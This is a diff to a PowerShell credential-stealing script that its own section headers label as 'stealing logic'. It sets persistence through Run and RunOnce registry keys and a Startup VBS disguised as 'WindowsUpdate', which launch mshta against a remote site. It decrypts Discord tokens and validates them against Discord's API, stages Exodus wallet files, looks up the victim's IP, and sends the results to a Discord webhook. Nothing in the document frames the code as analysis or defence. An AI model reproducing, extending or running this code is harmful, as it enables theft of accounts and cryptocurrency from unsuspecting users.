@@ -3,25 +3,28 @@ $ErrorActionPreference = "SilentlyContinue"
 # =====================================================================
 # ─── CONFIG & WEBHOOK ───
 # =====================================================================
-$WH = "https://api.dicerigx.app/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
+$WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
 
 function dbg($title, $desc, $color) {
     $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
-    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 3 | Out-Null } catch {}
+    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 5 | Out-Null } catch {}
 }
 
 # =====================================================================
-# ─── PERSISTENCE ───
+# ─── SELF-PERSISTENCE (MSHTA) ───
 # =====================================================================
 try {
     $CMD = 'mshta.exe "https://dicerigx.app/"'
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $CMD -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WinUpdate" -Value $CMD -ErrorAction SilentlyContinue
     $StartupVBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Set-Content -Path $StartupVBS -Value "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False" -ErrorAction SilentlyContinue
+    $VBSContent = "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False"
+    Set-Content -Path $StartupVBS -Value $VBSContent -ErrorAction SilentlyContinue
+    dbg ":pushpin: Persistence" "MSHTA startup methods installed" 65280
 } catch {}
 
 # =====================================================================
-# ─── DISCORD TOKENS ───
+# ─── STEALING LOGIC: CRYPTO SETUP ───
 # =====================================================================
 Add-Type -AssemblyName System.Security
 $csharp = @"
@@ -49,6 +52,11 @@ public class Gcm {
 Add-Type -TypeDefinition $csharp -Language CSharp
 
 $appdata = $env:APPDATA
+$l = $env:LOCALAPPDATA
+
+# =====================================================================
+# ─── DISCORD TOKENS ───
+# =====================================================================
 $mk = $null
 try {
     $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
@@ -82,7 +90,7 @@ foreach ($dp in $discordPaths) {
 
 foreach ($t in $tokens.Keys) {
     try {
-        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 3
+        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
         if ($r.username) {
             $info = "**User:** $($r.username)`n"
             if ($r.email) { $info += "**Email:** $($r.email)`n" }
@@ -95,7 +103,7 @@ foreach ($t in $tokens.Keys) {
 }
 
 # =====================================================================
-# ─── EXODUS WALLET ONLY ───
+# ─── WALLET (EXODUS ONLY) ───
 # =====================================================================
 $dw = @{ Exodus="$appdata\Exodus" }
 $staging = Join-Path $env:TEMP "wallets"
@@ -156,6 +164,6 @@ foreach ($rp in $rbxPaths) {
 # ─── SYSTEM INFO ───
 # =====================================================================
 try {
-    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 3).Trim()
+    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
     dbg ":dart: Target" "**IP:** $ip `n**PC:** $env:COMPUTERNAME" 3447003
 } catch {}
